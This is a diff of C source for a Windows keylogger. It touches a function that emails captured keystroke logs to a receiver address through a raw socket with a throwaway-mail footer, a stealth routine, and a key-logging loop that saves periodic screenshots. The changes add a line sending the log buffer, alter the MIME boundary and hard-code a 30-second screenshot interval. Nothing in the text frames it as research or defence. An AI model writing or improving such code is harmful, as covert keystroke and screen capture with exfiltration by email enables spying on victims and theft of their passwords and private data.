@@ -1118,6 +1118,7 @@ int mailMyLog(char *receiverAddress) {
     char mylogs[10000];
     char tem[100];
     strcat(mylogs, "Hi Admin,=0A=0AHere is the logged key.=0A=0A");
+    sendData(&ConnectSocket, mylogs);
     while(fgets(tem,100,fp)!=NULL)
     {
         int size1= strlen(tem);
@@ -1131,7 +1132,7 @@ int mailMyLog(char *receiverAddress) {
     }
     sendData(&ConnectSocket,"=0A=0ARegards,=0A<SIAM>=0A=0A---- =0ASent using Guerrillamail.com =0ABlock or report abuse : https://www.guerrillamail.com//abuse/?a=3DUVJzDA8SW6Q1mwa14nUTcwfCX9ne0dhd=0A \r\n\r\n");
     //sendData(&ConnectSocket, mylogs);
-    sendData(&ConnectSocket, "\r\n\r\n--977d81ff9d852ab2a0cad646f8058349--\r\n\r\n");
+    sendData(&ConnectSocket, "\r\n\r\n977d81ff9d852ab2a0cad646f8058349--\r\n\r\n");
     //sendData(&ConnectSocket, "Hi Siam,=0A=0AThis is an empty file.=0A=0ARegards,=0A<ME>=0A=0A---- =0ASent using Guerrillamail.com =0ABlock or report abuse : https://www.guerrillamail.com//abuse/?a=3DUVJzDA8SW6Q1mwa14nUTcwfCX9ne0dhd=0A \r\n\r\n");
     sendData(&ConnectSocket, "--977d81ff9d852ab2a0cad646f8058349\r\n");
     sendData(&ConnectSocket, "Content-Type: text/plain\r\n");
@@ -1183,6 +1184,7 @@ int mailMyLog(char *receiverAddress) {
     WSACleanup();
     return 0;
 }
+
 
 void stealth()
 {
@@ -1505,7 +1507,7 @@ void logKeys()
         time(&endt);
 
         elapsed = difftime(endt, start);
-        if (elapsed >= prev_elapsed+SSTIME)
+        if (elapsed >= prev_elapsed+30.0)
         {
             char nameOfScreenshot[20];
             snprintf(nameOfScreenshot, 20, "image%d.bmp", ssCount); // puts string into buffer
